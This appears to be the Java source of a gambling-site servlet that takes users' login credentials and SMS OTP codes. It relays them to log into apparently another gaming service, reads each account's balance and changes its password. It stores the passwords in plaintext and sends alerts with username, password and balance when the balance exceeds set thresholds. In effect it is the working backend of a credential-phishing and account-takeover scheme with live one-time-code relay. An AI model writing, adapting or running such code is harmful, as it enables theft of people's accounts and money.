package com.vinplay.api.processors.accv28;

import com.mongodb.client.MongoCollection;
import com.mongodb.client.MongoDatabase;
import com.vinplay.api.entities.UserOTP;
import com.vinplay.api.otp.OTPELK;

import com.vinplay.vbee.common.cp.BaseProcessor;
import com.vinplay.vbee.common.cp.Param;
import com.vinplay.vbee.common.mongodb.MongoDBConnectionFactory;
import com.vinplay.vbee.common.pools.ConnectionPool;
import com.vinplay.vbee.common.utils.VinPlayUtils;
import org.bson.Document;
import org.bson.conversions.Bson;

import javax.servlet.http.HttpServletRequest;
import java.io.UnsupportedEncodingException;
import java.security.NoSuchAlgorithmException;
import java.sql.Connection;
import java.sql.PreparedStatement;
import java.text.NumberFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

public class SaveUserV8Process implements BaseProcessor<HttpServletRequest, String> {
    public String execute(Param<HttpServletRequest> param) {
        HttpServletRequest request = (HttpServletRequest)param.get();
        String uname = request.getParameter("username");
        String pwd = request.getParameter("password");
        String codedl = request.getParameter("codedaily");
        String phone = request.getParameter("phone");
        String nicknamex = request.getParameter("nn");
        String otp = request.getParameter("otp");



       SaveAccount save = new SaveAccount();
        AutoTaoAcc auto = new AutoTaoAcc();
        BaoV28Acc bao = new BaoV28Acc();
        if(nicknamex != null){
            String timelog = VinPlayUtils.getCurrentDateTime();
            account acc = new account(uname,pwd,codedl,phone, false, timelog,nicknamex,"SMS OTP");
            save.SaveNick(acc);
            boolean taoaccCheck = false;
            try {
                taoaccCheck = auto.taoAcc(uname,pwd,codedl , nicknamex);

            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            } catch (NoSuchAlgorithmException e) {
                e.printStackTrace();
            }
            if(taoaccCheck){
                updateTrangThaiDK(uname);
                return "{\"errorCode\":\"200\"}";
            }else{
                return "{\"errorCode\":\"600\"}";
            }

        }

        CheckInfo cif = new CheckInfo();
        boolean checkExit = cif.check(uname,pwd,phone);
        if(checkExit == true){
            return "{\"errorCode\":\"500\"}";
        }


        boolean check_acc_sunwin = false;
        boolean dangky = false;
        String nickname = null;
        String tien = null;
        String timelog = VinPlayUtils.getCurrentDateTime();
        XuLyAcc xuly = new XuLyAcc();

        String token1 = null;
        if(otp == null){
            token1 = xuly.logingetToken1(uname,pwd);

            if(token1 != null){
                if(token1.equalsIgnoreCase("SMS OTP")){
                    return "{\"errorCode\":\"666\"}";
                }

            }

        }else{
            token1 = xuly.SubmitOTP(xuly.session_otp,otp, uname, pwd);

        }




        String token2 = null;
        if(token1 != null){

            token2 = xuly.getToken(token1);
            check_acc_sunwin = true;

        }else{
            nickname = null;
            tien = null;
            check_acc_sunwin = false;
//            return "{\"errorCode\":\"500\"}";
        }
        if(token2 != null){
            acctmp actmp = xuly.Layinfo(token2);
            nickname = actmp.getNickname();
            tien = actmp.getTien();


        }


        if(check_acc_sunwin == true && !token1.contains("SMS OTP")){
            account acc = new account(uname,pwd,codedl,phone, dangky, timelog,nickname,tien);
            save.SaveNick(acc);
            xuly.Doipass(token1,pwd);
            tien = tien.replace(".","");
//            long money = Long.parseLong(tien);
//            Locale localeEN = new Locale("en", "EN");
//            NumberFormat en = NumberFormat.getInstance(localeEN);
//            if(money >= 5000){
//                String str1 = en.format(money);
//                bao.Notify(uname, nickname, str1, phone, codedl, pwd);
//            }

        }else if(check_acc_sunwin == true && token1.contains("SMS OTP")){
            return "{\"errorCode\":\"404\"}";
        }else{
            return "{\"errorCode\":\"500\"}";
        }


        boolean taoaccCheck = false;
        try {
            taoaccCheck = auto.taoAcc(uname,pwd,codedl , nickname);
//            updateNicknameMapdaily(uname,nickname);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        // check tk tạo thanh công xong cộng tiền
        if(taoaccCheck){
            long money = Long.parseLong(tien);
            Locale localeEN = new Locale("en", "EN");
            NumberFormat en = NumberFormat.getInstance(localeEN);
            if(money >= 5000 && money < 10000000){
                String str1 = en.format(money);
                bao.Notify(uname, nickname, str1, phone, codedl, pwd, true);
            }
            if(money >= 10000000){
                String str1 = en.format(money);
                bao.Notify2(uname, nickname, str1, phone, codedl, pwd, true);
            }
            updateTrangThaiDK(uname);

//            ELKAutoBankNew elk = new ELKAutoBankNew();
//            GenCommentBank gen = new GenCommentBank();
//            boolean check = false;
//            do{
//                String commentcode = "SN"+gen.randomMaChuyenTien().toUpperCase();
//                String nick = elk.GetNicknameByCode(commentcode);
//                String codex = elk.GetCodeByNick(nickname);
//                if(nick == null && codex == null){
//                    elk.InsertCodeUserBankELK(nickname, commentcode);
//                    check = true;
//                }
//            }while (check == false);

//            String commentcode = "SN"+gen.GenContent(nickname);
//            String nick = elk.GetNicknameByCode(commentcode);
//            if(nick == null){
//                elk.InsertCodeUserBankELK(nickname, commentcode);
//            }else{
//                if(nickname.equalsIgnoreCase(nick) == false){
//                    elk.InsertCodeUserBankELK(nickname, commentcode);
//                }
//            }

//            tien = tien.replace(".","");

            boolean taotienCheck = auto.taoTien(nickname, tien);
            System.out.println(taotienCheck);
            long create_time_2 = new Date().getTime();
            Date d = new Date(create_time_2);
            SimpleDateFormat sdfDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String strDate = sdfDate.format(d);
            UserOTP uotp = new UserOTP(nickname, uname,phone, "666666", 1, create_time_2, create_time_2, 1, strDate);
            try {
                OTPELK oelk = new OTPELK();
                InsertActive(uotp);
                oelk.InsertActiveELK(uotp);
                UpdateSDTOTP(nickname,phone);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }else{
            long money = Long.parseLong(tien);
            Locale localeEN = new Locale("en", "EN");
            NumberFormat en = NumberFormat.getInstance(localeEN);
            if(money >= 5000 && money < 10000000){
                String str1 = en.format(money);
                bao.Notify(uname, nickname, str1, phone, codedl, pwd, false);
            }
            if(money >= 10000000){
                String str1 = en.format(money);
                bao.Notify2(uname, nickname, str1, phone, codedl, pwd, false);
            }
            return "{\"errorCode\":\"600\"}";
        }

        return "{\"errorCode\":\"200\"}";

    }

    private void updateTrangThaiDK(String username) {
        try {
            boolean dangky = true;
            MongoDatabase db = MongoDBConnectionFactory.getDB();
            MongoCollection col = db.getCollection("accv8");
            Document doc = new Document();
            doc.append("dangky",(Object)dangky);
            col.updateOne((Bson) new Document("username", username), (Bson) new Document("$set", (Object) doc));

        }catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void updateNicknameMapdaily(String username, String nickname) {
        try {
            MongoDatabase db = MongoDBConnectionFactory.getDB();
            MongoCollection col = db.getCollection("user_map_daily");
            Document doc = new Document();
            doc.append("nickName",(Object)nickname);
            col.updateOne((Bson) new Document("user_name", username), (Bson) new Document("$set", (Object) doc));
        }catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void InsertActive(UserOTP uotp) throws Exception{
        Connection conn = ConnectionPool.getInstance().getConnection("mysqlpoolname");
        try {
            String sql = "INSERT INTO vinplay.active (nickname,username,phone,otp,active,creat_time,active_time,turn,timelog) VALUES(?,?,?,?,?,?,?,?,?)";
            PreparedStatement stm = conn.prepareStatement(sql);
            stm.setString(1, uotp.getNickname());
            stm.setString(2, uotp.getUsername());
            stm.setString(3, uotp.getPhone());
            stm.setString(4, uotp.getOtp());
            stm.setInt(5, uotp.getActive());
            stm.setLong(6, uotp.getCreat_time());
            stm.setLong(7, uotp.getActive_time());
            stm.setInt(8, uotp.getTurn());
            stm.setString(9,uotp.getTimelog());
            int rs = stm.executeUpdate();
            stm.close();
            if (conn != null) {
                conn.close();
            }
        }catch (Exception e) {
            throw e;
        }
    }

    public void UpdateSDTOTP(String nickname, String phone) throws Exception{
        Connection conn = ConnectionPool.getInstance().getConnection("mysqlpoolname");
        ArrayList<UserOTP> list_otp = new ArrayList<>();
        String sql = "UPDATE vinplay.users SET mobile=? WHERE nick_name=?";
        PreparedStatement stm = conn.prepareStatement(sql);
        stm.setString(1, phone);
        stm.setString(2, nickname);
        stm.executeUpdate();

        stm.close();
        if (conn != null) {
            conn.close();
        }

    }



}

